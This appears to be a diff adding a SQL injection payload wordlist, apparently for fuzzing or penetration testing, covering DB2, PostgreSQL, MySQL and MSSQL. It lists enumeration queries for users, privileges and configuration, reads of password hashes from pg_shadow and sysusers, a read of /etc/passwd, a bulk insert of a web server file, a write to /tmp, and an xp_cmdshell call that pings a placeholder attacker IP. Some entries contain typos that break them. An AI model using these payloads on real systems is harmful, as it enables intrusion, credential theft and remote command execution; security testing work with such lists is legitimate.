@@ -1,0 +1,37 @@
+SELECT schemaname FROM syscat.schemata;
+copy myfile from '/etc/passwd';
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp‚'" select * from myfile"--
+exec master..xp_cmdshell 'ping+<attackerip>'
+select * from master..sysserverse
+select * from myfile;copy myfile to /tmp/test;
+select * from pg_group;
+select * from pg_shadow;
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth where grantee = current user;
+select * from syscat.tabauth;
+select * from sysusers
+select @@microsoftversione
+select @@servernamee
+select @@version
+select current server from sysibm.sysdummy1;
+select current_database();
+select current_setting('config_file');
+select current_setting('data_directory');
+select current_setting('hba_file');
+select current_setting('krb_server_keyfile');
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('password_encryption');
+select current_setting('port');
+select current_setting('virtual_host');
+select current_user;
+select grantee from syscat.dbauth;
+select name from sysibm.systables;
+select name, tbname, coltype from sysibm.syscolumns;
+select session_user from sysibm.sysdummy1;
+select session_user;
+select system_user from sysibm.sysdummy1;
+select user from sysibm.sysdummy1;
+select version();
+select versionnumber, version_timestamp from sysibm.sysversions;
